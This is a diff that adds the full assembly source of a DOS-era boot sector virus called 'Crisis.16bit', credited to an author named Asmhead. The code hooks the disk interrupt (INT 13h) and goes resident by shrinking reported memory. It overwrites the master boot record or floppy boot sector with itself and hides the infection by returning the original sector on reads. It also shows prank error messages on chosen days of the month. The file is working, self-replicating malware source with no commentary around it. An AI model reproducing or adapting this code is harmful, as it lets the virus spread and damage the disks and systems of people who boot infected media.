@@ -1,0 +1,218 @@
+
+;Name: Crisis.16bit
+;Author: Asmhead
+;Origin: Malang, Indonesia
+;
+;Stealth: yes
+;Payload: harmless
+;Increase Bytes: 505 bytes
+
+   .286
+   .model tiny
+   .code
+   org 0h
+begin:
+       jmp short start_virus
+       db 3ch dup (0)   
+start_virus:
+Check_Int_21_Killers:
+        cmp     al,0CDh                      ;INT call?
+        jne     End_Check_Int_21
+        cmp     byte ptr [si],021h           ;21?
+        jne     End_Check_Int_21
+        or      byte ptr cs:[_Status],2      ;turn on fake int address
+End_Check_Int_21:
+       db  0beh
+_beginof_virus: dw 7c00h
+
+       sub ax,ax
+
+       cli              
+       mov ss,ax                  ;SS=0
+       mov sp,si                  ;SP=7C00h
+       sti                        ;enable interrupts
+                                  ;decrease the TOM with 1Kb
+       mov ds,ax                  ;DS=0
+
+       dec word ptr ds:[413h]     ;subtract 1 Kb of memory
+       mov ax,word ptr ds:[413h]
+
+       mov cl,6
+       shl ax,cl                  ;convert from kilobytes to paragraphs
+       mov es,ax                  ;ES is now equal to the new segment
+
+       xor di,di                  ;ES:DI=ES:0
+       mov cx,(768/3)             ;256
+       cld
+       rep movsw
+
+       push es                    ;save the new segment on stack
+       lea ax,[HookInt13h]
+       push ax                    ;save the offset where to jump
+       retf                       ;jump to our virus in memory
+
+HookInt13h:
+   mov ax, word ptr ds:[13h*4]     ;get the original int 13h entrypoint
+   lea di, word ptr cs:[old_int13h]
+   stosw
+   mov ax, word ptr ds:[13h*4+2]
+   lea di, word ptr cs:[old_int13h+2]
+   stosw
+
+   mov word ptr ds:[13h*4+2],es        ;set the segment
+   lea ax,myint13h                     ;set the new interrupt handler to
+   lea di, word ptr ds:[13h*4]
+   stosw
+
+   call  payload
+
+   int 19h                             ; Reboot but not clear memory ;)
+
+myint13h:
+     cmp dh,0                            ;check if head 0
+     jne exit_handler
+     cmp cx,1                            ;check if sector 1 and track 0
+     jne exit_handler
+     cmp ah,2                            ;read from sector 1 ?
+     jne exit_handler
+     call bios_int13h                    ;fake the call
+     jnc lets_eat_meat                   ;if no error, jump to our code
+exit_handler:
+     db 0eah                           ;else jump to the original Int 13h
+old_int13h dd ?
+
+lets_eat_meat:
+   pushf                               ;save everything on stack
+   pusha
+   push ds es
+
+   cmp word ptr es:[bx+offset InfectMark],'FK'   ;check to see if infected
+   jne Infect_MBR_BS
+
+stealth:
+   mov  ax,201h                       ;read the original MBR/BS in memory
+   call stealth_sector
+   jnc  @@exec_int13
+   db   0eah
+   dw   offset old_int13h
+@@exec_int13:
+   call bios_int13h
+   jmp  exit
+_Status db  0
+Infect_MBR_BS:
+   push cs cs
+   pop ds es                           ;DS=ES=CS
+;   push bx 					;save bx
+
+   mov bx,(512*2)/2                    ;put it in CS:512
+   mov ax,201h                         ;read one sector
+   jnc complete_next_copy
+   clc
+complete_next_copy:
+   call bios_int13h
+
+   mov cx,3ch                          ;copy 3ch bytes
+   mov si,(1028/2)                     ;from CS:514
+   mov di,2                            ;to CS:2
+   cld                                 ;clear direction flag
+   rep movsb                           ;move from DS:SI to ES:DI
+
+;    pop si					;pop saved bx into si
+;    add si, 1Beh				;add 1beh to point to partitiontable
+;    mov di, Partitiontable-StartCode ;load in di the partitiontable buffer
+;    mov cx, 40h					;copy it into the buffer
+;    rep movsb					;do it
+
+   mov si,bx
+   add bx,offset PartitionTable
+   lea di,PartitionTable
+   mov cx,64
+   rep movsb
+
+   call choose_sector
+   call write_virus                    ; write original MBR/BS
+
+   sub bx,bx                           ;from CS:0
+   sub dh,dh                           ;to head 0
+   mov cx,1                            ;track 0, sector 1
+   call write_virus                    ; write our virus
+
+exit:
+   pop es ds                          ;pop everything from the stack
+   popa
+   popf
+   retf 2
+
+choose_sector:
+   mov cx,2                 ;original MBR in sector 2
+   cmp dl,79h               ;check if hard drive
+   ja hard_disk             ;DL>79h => hard disk, else floppy disk
+   mov dh,1                 ;original BS in head 1
+   mov cx,14                ;... sector 14
+hard_disk:
+   ret
+
+stealth_sector:
+   or  dl,dl
+   jp  hard_disk2
+   inc dh
+   mov cx,14
+   ret
+
+hard_disk2:
+   sub dh,dh
+   mov cx,2
+   ret
+write_virus:
+   mov ax,301h
+bios_int13h:
+   pushf                          ;push flags on stack
+   cld
+   call dword ptr cs:[old_int13h] ;call the original entrypoint of int 13h
+   ret                            ;return to the caller
+
+ Payload:                   ; a simple and harmless payload, it just
+  mov ah,4                  ; displays a message on every 1st of a month
+  int 1ah                   ; when booting from an infected disk.
+  cmp dl,1
+  je  DisplayMessage
+  cmp dl,20
+  je  BootMessage
+  ret
+
+ DisplayMessage:
+  lea si,[7c00h + Message]
+  call Msg_looping
+  ret
+ BootMessage:
+  lea si,[7c00h + BootMsg]
+  call Msg_looping
+  ret
+
+Msg_looping:
+  mov ah,0eh
+  mov bx,7
+ MsgLoop:
+  lodsb
+  or al,al
+  jz MsgDone
+  int 10h
+  jmp MsgLoop
+ MsgDone:
+  xor ah,ah
+  int 16h
+  ret
+
+InfectMark  db 'KF'                    ;virus signature
+ BootMsg db ' Processor has error in offset 1bx0ch ',0ah,0dh
+         db ' Return your processor to nextdoor dealer',0ah,0dh
+
+ Message db '  YoUr c0Mp haZ 5eRIoUS DisEAsE',0ah,0dh
+         db '    CrISis 16Bit Takeover tHe rES7 ',0ah,0dh
+
+   Org 1beh
+ PartitionTable:
+   db 64 dup('X')
+
+   db 055h,0aah                   ;boot signature
+end begin
